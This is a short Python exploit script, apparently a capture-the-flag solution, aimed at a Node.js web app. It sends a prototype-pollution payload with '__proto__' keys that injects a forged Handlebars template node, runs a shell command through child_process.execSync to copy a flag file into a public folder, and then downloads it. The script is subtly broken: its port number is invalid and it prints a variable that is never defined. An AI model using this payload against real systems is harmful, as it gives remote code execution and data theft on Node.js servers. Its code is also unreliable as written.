import requests

TARGET_URL = 'http://139.59.166.56:302698'

# make pollution
requests.post(TARGET_URL + '/api/submit', json = {
    "artist.name":"Gingell",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`cat flag > /app/static/out`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})
print(r.status_code)
print(r.text)
print(requests.get(TARGET_URL+'/static/out').text)



# execute
